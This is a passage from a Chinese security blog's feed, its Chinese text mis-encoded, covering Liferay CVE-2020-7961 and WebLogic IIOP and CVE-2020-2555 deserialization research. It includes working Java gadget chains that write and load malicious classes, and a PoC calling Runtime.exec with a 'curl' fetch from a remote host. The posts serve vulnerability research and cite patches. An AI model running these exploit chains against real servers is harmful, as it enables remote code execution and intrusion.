ä¸­è¿›è¡Œç±»å‹è½¬æ¢ï¼Œåœ¨è½¬æ¢çš„è¿‡ç¨‹ä¸­ä¼šè¿›è¡ŒæŠ›å‡ºå¼‚å¸¸ï¼Œé€šè¿‡æ•è·å¼‚å¸¸ä¹‹åä¼šè¿›è¡Œåˆ¤å®šæ˜¯å¦ä¸º <code>Map</code> å¹¶ä¸”æ˜¯ <code>{</code> å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p><img src="https://img.zhiiyun.com/blog_bf03027e5eddf5da8cca7ca763d530f1" alt=""></p><p><img src="https://img.zhiiyun.com/blog_942594a1439dff5bc98e6d5ffda19e1f" alt=""></p><p><img src="https://img.zhiiyun.com/blog_07736f5d3bf3a45a0109cae28f22e1a3" alt=""></p><h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>ä¿®å¤ç‰ˆæœ¬ï¼š6.2 GA6ã€7.0 GA7ã€7.1 GA4 å’Œ 7.2 GAã€‚</p><p>ç›®å‰å®˜æ–¹å·²å‘å¸ƒäº†å®‰å…¨è¡¥ä¸ï¼Œå¯é€šè¿‡ <a href="https://liferay.dev/blogs/-/blogs/security-patches-for-liferay-portal-6-2-7-0-and-7-1" target="_blank" rel="noopener">https://liferay.dev/blogs/-/blogs/security-patches-for-liferay-portal-6-2-7-0-and-7-1</a> è¿›è¡Œç›¸åº”ç‰ˆæœ¬çš„ä¸‹è½½ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://nosec.org/home/detail/4376.html" target="_blank" rel="noopener">ã€å®‰å…¨é€šæŠ¥ã€‘Liferay Portalä¸­çš„RCEæ¼æ´</a></li><li><a href="https://www.javaweb.org.cn/3255.shtml" target="_blank" rel="noopener">CVE-2020-7961 æ°´æ–‡ä¸€ç¯‡</a></li><li><a href="https://github.com/mzer0one/CVE-2020-7961-POC" target="_blank" rel="noopener">https://github.com/mzer0one/CVE-2020-7961-POC</a></li><li><a href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html" target="_blank" rel="noopener">Liferay Portal JSON Web Service RCE Vulnerabilities</a></li><li><a href="https://twitter.com/chybeta/status/1242133506974560256" target="_blank" rel="noopener">https://twitter.com/chybeta/status/1242133506974560256</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;è¿‘æ—¥æœ‰ Code White å®‰å…¨å›¢é˜Ÿå‘ç°å…³äº Liferay Portal å¤šä¸ªæ¯”è¾ƒä¸¥é‡çš„ JSON fan å
      
    
    </summary>
    
      <category term="æ¼æ´ç ”ç©¶" scheme="http://www.r4v3zn.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="cve" scheme="http://www.r4v3zn.com/tags/cve/"/>
    
      <category term="Liferay Portal" scheme="http://www.r4v3zn.com/tags/Liferay-Portal/"/>
    
  </entry>
  
  <entry>
    <title>weblogic IIOPæ¼æ´çš„å›æ˜¾æ„é€ ç ”ç©¶</title>
    <link href="http://www.r4v3zn.com/posts/51fa2b96/"/>
    <id>http://www.r4v3zn.com/posts/51fa2b96/</id>
    <published>2020-03-19T06:09:43.000Z</published>
    <updated>2020-11-11T08:06:56.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>é¦–å…ˆè¦ç†è§£è¯¥æ¼æ´çš„è¯ï¼Œå…ˆè¦çŸ¥é“å‡ ç‚¹ï¼š</p><ol><li>ä»€ä¹ˆæ˜¯IIOPåè®®</li><li>ä»€ä¹ˆæ˜¯RMIåè®®</li><li>è¿™ä¸¤ä¸ªåè®®ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«</li></ol><p>è¿™å‡ ç‚¹å¯è‡ªè¡Œæœç´¢æŸ¥çœ‹ï¼Œåœ¨å…ˆçŸ¥ä¸­ä¹Ÿæœ‰ä¸å°‘ä¾‹å­ã€‚</p><h2 id="0x02-å›æ˜¾åˆ†æ"><a href="#0x02-å›æ˜¾åˆ†æ" class="headerlink" title="0x02 å›æ˜¾åˆ†æ"></a>0x02 å›æ˜¾åˆ†æ</h2><p>åœ¨æˆ‘è¿™ä¸ªèœé¸¡ç†è§£çš„IIOPå’ŒRMIåè®®åŒºåˆ«æ˜¯æ²¡ä»€ä¹ˆåŒºåˆ«åæ­£éƒ½æ˜¯è¿œç¨‹è°ƒç”¨å¯¹è±¡ï¼Œæ‰€ä»¥å°±ç”¨RMIå†™äº†ä¸ªè¿œç¨‹æ‰§è¡Œå‘½ä»¤çš„HelloWordæ¥åšäº†ä¸ªå®éªŒã€‚</p><p>ç¼–å†™RMIè¿‡ç¨‹æ­¥éª¤</p><p>1ã€ä¸€ä¸ªå¿…é¡»ç»§æ‰¿Remoteçš„æ¥å£å¹¶ä¸”æŠ›å‡ºRemoteExceptionå¼‚å¸¸</p><p><img src="http://img.zhiiyun.com/blog_1868646ef0d86562ab3f053b9510f9dd" alt=""></p><p>2ã€å¼•ç”¨å¹¶å®ç°è¯¥æ¥å£</p><p><img src="https://img.zhiiyun.com/blog_4dbdfe80de7a4b2596d2856281b7268a" alt=""></p><p>3ã€æœåŠ¡ç«¯å¼€å¯è¿œç¨‹è°ƒç”¨å¹¶ä¸”å®ç°ç»‘å®šè¯¥æ¥å£</p><p><img src="https://img.zhiiyun.com/blog_f8604b9f5b63fc9557377d290dbae139" alt=""></p><p>4ã€å®¢æˆ·ç«¯ç›´æ¥è¿œç¨‹è°ƒç”¨è¯¥æ¥å£</p><p><img src="https://img.zhiiyun.com/blog_43ae797113122666725fd7df9935d2a7" alt=""></p><p>5ã€æœ€åæ‰§è¡Œæ•ˆæœ</p><p><img src="https://img.zhiiyun.com/blog_d43d917eae7b913ddd9e3357aca82780" alt=""></p><p>å¯ä»¥çœ‹åˆ°é€šè¿‡æ‰‹åŠ¨å†™çš„RMIè°ƒç”¨çš„ä¾‹å­ä¸Šæ˜¯å¯ä»¥å®ç°RMIå›æ˜¾çš„,æ—¢ç„¶RMIå’ŒIIOPéƒ½ä¸€æ ·é‚£ä¹ˆåœ¨IIOPä¸­æ˜¯å¦ä¹Ÿèƒ½é€šè¿‡è¿™ç§æ–¹å¼å›æ˜¾å‘¢ï¼Œè¦åœ¨Weblogicä¸­å®ç°æ­¤æ–¹æ³•å›æ˜¾ï¼Œä¹Ÿè¦è·ŸRMIä¸€æ ·è¦ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æ¥å£ï¼Œè¦ä¸€ä¸ªå®ç°è¯¥æ¥å£çš„æ¶æ„ç±»ï¼Œç„¶åè¿›è¡Œç»‘å®šï¼Œå› ä¸ºåœ¨ weblogic ä¸­ 7001 ç«¯å£æ˜¯å¤šä¸­åè®®åŒ…æ‹¬ IIOPï¼Œæ‰€ä»¥å°±ä¸è¡Œå¼€å¯è¿œç¨‹ç«¯å£ï¼Œåªéœ€è¦ç»‘å®šä¸Šå³å¯ã€‚</p><p>é‚£ä¹ˆç¬¬ä¸€æ­¥å¼€å§‹æŸ¥æ‰¾ weblogic ä¸­æŸ¥æ‰¾å¯ä»¥è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼Œæœ€ç»ˆåœ¨weblogicå‘ç°äº†å®Œç¾ç¬¦åˆè¦æ±‚çš„ä¸€ä¸ªç±»ã€‚</p><p><img src="https://img.zhiiyun.com/blog_ee2e94ef2e9f4b067839c22f91d98d26" alt=""></p><p>ç¬¬äºŒæ­¥å¼•ç”¨å¹¶ä¸”å®ç°è¯¥ç±»ï¼Œåœ¨ç»è¿‡æŸ¥æ‰¾åå¹¶æ²¡æœ‰å‘ç°å¯ä»¥å®ç°è¯¥ç±»çš„æ–¹æ³•ï¼Œæƒ³äº†æƒ³åœ¨weblogicä¸€äº›ç‰ˆæœ¬ä¸­æ˜¯å­˜åœ¨ CommonsCollections3.1 çš„è¿™ä¸ªç‰ˆæœ¬ä¸­æ˜¯å­˜åœ¨å¯åˆ©ç”¨çš„ååºåˆ—åŒ– gadget çš„ï¼Œæƒ³äº†ä¸€ä¸‹å¯ä»¥é€šè¿‡å†™ä¸€ä¸ªå®ç°å®ç°è¯¥ç±»çš„æ–¹æ³•å†™å…¥åˆ°æœåŠ¡å™¨æœ¬åœ°ç„¶åç»‘å®šè¯¥ç±»å®ç°è°ƒç”¨ï¼Œåœ¨é»˜è®¤ ysoserial ä¸­æ˜¯æ²¡æœ‰å†™æ–‡ä»¶çš„ gedget çš„æ‰€ä»¥å°±è¦ä¿®æ”¹ä¸€ä¸ªå¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;new ConstantTransformer(FileOutputStream.class),</span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;</span><br><span class="line">                        , new Class[]&#123;Class[].class&#125;</span><br><span class="line">                        , new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;</span><br><span class="line">                        , new Class[]&#123;Object[].class&#125;</span><br><span class="line">                        , new Object[]&#123;new Object[]&#123;path&#125;&#125;), //ç»å¯¹è·¯å¾„</span><br><span class="line">                new InvokerTransformer(&quot;write&quot;</span><br><span class="line">                        , new Class[]&#123;byte[].class&#125;</span><br><span class="line">                        , new Object[]&#123;classBytes&#125;)&#125;; //å†™å…¥classç±»çš„bytes</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ­¤æ–¹æ³•å†™å…¥è¿›å»äº†å®ç°è¿œç¨‹è°ƒç”¨æ¥å£çš„ç±»ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»‘å®šï¼Œä½†æ˜¯å·²æœ‰çš„pocä¸­ç›´æ¥ç»‘å®šè‚¯å®šæ˜¯ä¸è¡Œçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, object), Remote.class);</span><br><span class="line">   initialContext.rebind(&quot;testets&quot;,remote);</span><br></pre></td></tr></table></figure><p>åœ¨ä¸ä¹‹å‰ Hello å¯¹æ¯”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello h=(Hello) UnicastRemoteObject.exportObject(hello,1099);</span><br><span class="line">registry.bind(&quot;Hello&quot;,h);</span><br></pre></td></tr></table></figure><p>æ˜æ˜¾æ˜¯ä¸åŒçš„æ²¡æœ‰åŠæ³•ç›´æ¥ç»‘å®šå†™å…¥é‚£ä¸ªå®ç°æ¥å£çš„é‚£ä¸ªæ¶æ„ç±»ï¼Œåæ¥æƒ³äº†ä¸€ä¸ªæ€è·¯å°±æ˜¯é€šè¿‡åœ¨æ¶æ„ç±»é‡Œç›´æ¥å†™ä¸€ä¸ªç»‘å®šçš„æ–¹æ³•ï¼Œç„¶åé€šè¿‡åˆ©ç”¨CommonsCollections3çš„gadgetæ”¹æˆæ‰§è¡Œé‚£ä¸ªæ¶æ„ç±»é‡Œçš„æ–¹æ³•æ¥ç»‘å®šå®ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class)</span><br><span class="line">                , new InvokerTransformer(&quot;getConstructor&quot;</span><br><span class="line">                , new Class[]&#123;Class[].class&#125;</span><br><span class="line">                , new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;)</span><br><span class="line">                , new InvokerTransformer(&quot;newInstance&quot;</span><br><span class="line">                , new Class[]&#123;Object[].class&#125;</span><br><span class="line">                , new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL(ClassPath)&#125;&#125;&#125;)//åŠ è½½ç»å¯¹è·¯å¾„çš„class</span><br><span class="line">                , new InvokerTransformer(&quot;loadClass&quot;</span><br><span class="line">                , new Class[]&#123;String.class&#125;</span><br><span class="line">                , new Object[]&#123;className&#125;)  //åŠ è½½è¯¥ç±»çš„åç§°</span><br><span class="line">                , new InvokerTransformer(&quot;getMethod&quot;</span><br><span class="line">                , new Class[]&#123;String.class, Class[].class&#125;</span><br><span class="line">                , new Object[]&#123;method, new Class[]&#123;String.class&#125;&#125;) //åå°„æ‰§è¡Œè¯¥ç±»çš„æ–¹æ³•</span><br><span class="line">                , new InvokerTransformer(&quot;invoke&quot;</span><br><span class="line">                , new Class[]&#123;Object.class, Object[].class&#125;</span><br><span class="line">                , new Object[]&#123;null, new String[]&#123;&quot;&quot;&#125;&#125;)&#125;;  //è¦æ‰§è¡Œçš„å‚æ•°</span><br></pre></td></tr></table></figure><p>è‡³äºå¦‚ä½•åœ¨æœ¬ç±»ç»‘å®šè°ƒç”¨å¯ä»¥ç”¨ <code>Context ctx = new InitialContext();</code> è¿™ä¸ªæ–¹å¼æ¥å®ç°ç»‘å®šï¼Œæœ€åç»‘å®šæˆåŠŸåå®ç°å›æ˜¾çš„è¯å°±è·Ÿ <code>Hello</code> ä¸­ä¾‹å­ä¸€æ ·<br><code>ClusterMasterRemote clusterMasterRemote=(ClusterMasterRemote)initialContext.lookup(&quot;tttt&quot;);</code></p><p>ç¼–å†™å®ç°</p><ol><li>å†™ä¸€ä¸ªå®ç°å¯å®ç°ClusterMasterRemoteæ¥å£çš„ç±»</li><li>ç¼–å†™å®ç°æ¥å£ç±»çš„ç»‘å®šæ–¹æ³•ï¼Œå¹¶ä¸”æŠŠå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å†™å…¥</li><li>æŠŠè¯¥ç±»é€šè¿‡ä¿®æ”¹è¿‡çš„gadgetåˆ©ç”¨é“¾é€šè¿‡IIOPæ¼æ´å†™å…¥åˆ°æœåŠ¡å™¨</li><li>é€šè¿‡ä¿®æ”¹è¿‡çš„gadgetæ‰§è¡Œå†™å…¥ç±»çš„ç»‘å®šæ–¹æ³•</li><li>æ‰§è¡Œå›æ˜¾ã€‚</li></ol><p>æœ€åæ”¾ä¸€ä¸ªæ‰§è¡Œçš„è¿‡ç¨‹ï¼š</p><p>å†™å…¥ç±»</p><p>æ‰§è¡Œç±»</p><p>æ‰§è¡Œå›æ˜¾</p><p><img src="https://img.zhiiyun.com/blog_2b0a7b1bf8d26cabd7e30e3859fbdb06" alt=""></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/5up3rc/weblogic_cmd" target="_blank" rel="noopener">https://github.com/5up3rc/weblogic_cmd</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä½œè€…ï¼šNtears</span><br><span class="line">é“¾æ¥ï¼šhttps://xz.aliyun.com/t/7393</span><br><span class="line">æ¥æºï¼šå…ˆçŸ¥</span><br><span class="line">è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x01-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x01 å‰è¨€&quot;&gt;&lt;/a&gt;0x01 å‰è¨€&lt;/h2&gt;&lt;p&gt;é¦–å…ˆè¦ç†è§£è¯¥æ¼æ´çš„è¯ï¼Œå…ˆè¦çŸ¥é“å‡ ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä»€ä¹ˆæ˜¯IIOPåè®®&lt;/li&gt;
&lt;li
      
    
    </summary>
    
      <category term="æ¼æ´ç ”ç©¶" scheme="http://www.r4v3zn.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="weblogic" scheme="http://www.r4v3zn.com/tags/weblogic/"/>
    
      <category term="iiop" scheme="http://www.r4v3zn.com/tags/iiop/"/>
    
  </entry>
  
  <entry>
    <title>æ¼«è°ˆ Weblogic CVE-2020-2555</title>
    <link href="http://www.r4v3zn.com/posts/975312a1/"/>
    <id>http://www.r4v3zn.com/posts/975312a1/</id>
    <published>2020-03-11T09:01:26.000Z</published>
    <updated>2020-11-11T08:06:56.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨2020å¹´1æœˆï¼Œäº’è”ç½‘ä¸Šçˆ†å‡ºäº†Weblogicååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-2555ï¼‰ï¼ŒOracle Fusionä¸­é—´ä»¶ Oracle Coherence å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´åœ¨æœªç»æˆæƒä¸‹é€šè¿‡æ„é€ T3åè®®è¯·æ±‚ï¼Œè·å– Weblogic æœåŠ¡å™¨æƒé™ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œé£é™©è¾ƒå¤§ã€‚</p><p>æ¼æ´ä¿¡æ¯æ›å…‰ä¹‹åï¼Œäº’è”ç½‘ä¸­å‘å¸ƒå‡ ç¯‡è¯¥æ¼æ´ç›¸å…³çš„åˆ†ææ–‡ç« ä»¥åŠåˆ©ç”¨ POCï¼Œä½†å…¬å¸ƒçš„ POC æœ‰éƒ¨åˆ†ä¸è¶³ä¹‹å¤„ï¼Œå¯¼è‡´æ¼æ´æ£€æµ‹æ•ˆç‡å˜ä½ï¼Œä¸è¶³ä¹‹å¤„ä¸»è¦ä½“ç°åœ¨ï¼š</p><p><strong>1 ç›®å‰æ‰€æœ‰çš„åˆ©ç”¨å·¥å…·éƒ½æ˜¯é€šè¿‡åŠ¨æ€ç¼–è¯‘è¿›è¡Œç”Ÿäº§ POC æ–‡ä»¶è€Œä¸”å¿…é¡»è¦æœ‰ java ç¯å¢ƒã€‚</strong></p><p><strong>2.  å…¬å¸ƒçš„ POC åªæ˜¯é’ˆå¯¹å•ç‹¬ä¸€ä¸ªç‰ˆæœ¬æœ‰æ•ˆï¼Œæ— æ³•é€‚åº”å¤šä¸ª Weblogic ç‰ˆæœ¬ã€‚</strong></p><p>æ¼æ´å½±å“æƒ…å†µï¼š</p><ul><li>Oracle Coherence 3.7.1.17</li><li>Oracle Coherence &amp; Weblogic  12.1.3.0.0</li><li>Oracle Coherence &amp; Weblogic 12.2.1.3.0</li><li>Oracle Coherence &amp; Weblogic 12.2.1.4.0</li></ul><p>é€šè¿‡ç ”ç©¶å‘ç° Weblogic 10.3.6.0 ç‰ˆæœ¬ä¸å—å½±å“èŒƒå›´å†…ï¼Œè™½ç„¶è¯¥ç‰ˆæœ¬é»˜è®¤è‡ªå¸¦äº† Coherenceï¼ˆ3.7ï¼‰ï¼Œé€šè¿‡è°ƒè¯•å‘ç°è¯¥ç‰ˆæœ¬é»˜è®¤å¹¶æœªå¯ç”¨ Coherenceï¼Œæ‰€ä»¥ Weblogic 10.3.6.0 ä¸åœ¨å—å½±å“èŒƒå›´å†…ã€‚</p><p><strong>æ³¨ï¼š</strong></p><p><strong>1. ç»è¿‡å¤§é‡çš„æµ‹è¯•ï¼Œæˆ‘ä»¬çš„ POC å¯ç¨³å®šè¿è¡Œåœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿã€å¤šä¸ª weblogic ç‰ˆæœ¬ã€å¤šä¸ª JDK ç‰ˆæœ¬ä¸­ã€‚</strong></p><p><strong>2. ä»¥ä¸Šæµ‹è¯•åŠåˆ†æç¯å¢ƒå…¨éƒ¨åŸºäºå†…éƒ¨ç¯å¢ƒã€‚</strong></p><h2 id="æ¼æ´è°ƒè¯•åˆ†æ"><a href="#æ¼æ´è°ƒè¯•åˆ†æ" class="headerlink" title="æ¼æ´è°ƒè¯•åˆ†æ"></a>æ¼æ´è°ƒè¯•åˆ†æ</h2><p><strong>æœ¬æ–‡åŸºäº Weblogic 12.1.3 ç‰ˆæœ¬è¿›è¡Œç ”ç©¶åˆ†ææµ‹è¯•ã€‚</strong></p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>ä¿®æ”¹ç›®å½• <code>user_project/domains/bin</code> ç›®å½•ä¸­ <code>setDomainEnv.cmd</code> æˆ–è€… <code>setDomainEnv.sh</code>  æ–‡ä»¶ï¼ŒåŠ <code>if %debugFlag == &quot;false&quot;%</code> ä¹‹å‰åŠ å…¥ <code>set debugFlag=true</code>ã€‚</p><p>æ‹·è´ <code>Oracle_Home</code> ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶è‡³è°ƒè¯•ç›®å½•ï¼Œå¹¶ä¸” <code>coherence\lib</code> æ·»åŠ  <code>Libraries</code>ï¼š</p><p><img src="https://img.zhiiyun.com/blog_b636d89a6eb8c2dbba118c4cc07b731f" alt=""></p><p>é…ç½® <code>Remote</code> æ–¹å¼è¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œ ip è®¾ç½®ä¸ºå¼€å¯ <code>set debugFlag=true</code> çš„æœåŠ¡å™¨ IPï¼Œ ç«¯å£ä¸º <code>8453</code> ï¼š</p><p><img src="https://img.zhiiyun.com/blog_0f5b23296a862f2bf90370233b2a428a" alt=""></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¯¥æ¼æ´ä¸»è¦æ˜¯å› ä¸º <code>com.tangosol.util.filter.LimitFilter#toString</code> æ–¹æ³•å†…éƒ¨å¯é€šè¿‡ <code>m_comparator</code> å’Œ <code>m_oAnchorTop</code> å¯è‡ªå®šä¹‰è¿›è¡Œè®¾ç½®ï¼Œå½¢æˆåˆ©ç”¨é“¾æ¡å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼Œä»¥ä¸‹ä¸ºæ•´ä¸ªåˆ©ç”¨é“¾æ¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                LimitFilter.toString()</span><br><span class="line">                    ChainedExtractor.extract()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ©ç”¨åˆ©ç”¨é“¾æ¡ï¼Œå¯ä»¥åŸºäº <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> ä¸­çš„ <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java" target="_blank" rel="noopener">CommonsCollections5</a> è¿›è¡Œæ„é€ åˆ©ç”¨ POCï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        String cmd = &quot;curl http://10.10.10.172:9999/Poc.class&quot;;</span><br><span class="line">        cmd = &quot;calc&quot;;</span><br><span class="line">        ValueExtractor[] valueExtractors = new ValueExtractor[]&#123;</span><br><span class="line">                new ReflectionExtractor(&quot;getMethod&quot;, new Object[]&#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0]</span><br><span class="line">                &#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;invoke&quot;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;&#125;)</span><br><span class="line">//                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        // chain</span><br><span class="line">        LimitFilter limitFilter = new LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime.class);</span><br><span class="line">        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);</span><br><span class="line">        m_comparator.setAccessible(true);</span><br><span class="line">        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));</span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);</span><br><span class="line">        m_oAnchorTop.setAccessible(true);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/0nise/IdeaProjects/vuldebug/cve-2020-2555/src/main/java/122130_linux_calc.666&quot;));</span><br><span class="line">        objectOutputStream.writeObject(expException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/blog_2c795b06cae4deaec7a9e1a2e7a70846" alt=""></p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¯¥æ¼æ´ä¸»è¦æ˜¯å› ä¸º <code>com.tangosol.util.filter.LimitFilter#toString</code> è§¦å‘ï¼Œé€šè¿‡è·Ÿè¸ªæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>m_oAnchorTop</code>  ä¸º <code>classs java.lang.Runtime</code> ï¼Œ ä»¥åŠ <code>m_comparator</code> ä¸º <code>ValueExtractor</code> æ¥å£çš„ <code>ChainedExtractor</code> å®ç°ã€‚</p><p><img src="https://img.zhiiyun.com/blog_32813d84b5b7121e60ed103496b9461a" alt=""></p><p><img src="https://img.zhiiyun.com/blog_7995538696b115c9a52e53e48225f3f7" alt=""></p><p>æ ¸å¿ƒé€šè¿‡ <code>extractor.extract</code> è¿›è¡Œè§¦å‘ï¼Œè·Ÿè¸ªä»£ç ä¼šè·³å…¥ <code>com.tangosol.util.extractor.ChainedExtractor#extract</code> ï¼Œå¹¶ä¸”å°†æ¯æ¬¡æ‰§è¡Œç»“æœä½œä¸ºå‚æ•°ï¼Œé€šè¿‡ <code>aExtractor[i].extract(oTarget)</code> è¿›è¡Œæ‰§è¡Œï¼Œç¬¬ä¸€æ¬¡ <code>oTarget</code> å‚æ•°å€¼ä¸º <code>class java.lang.Runtime</code></p><p><img src="https://img.zhiiyun.com/blog_0bee2748524ba8ade43d6bee4bd4b26a" 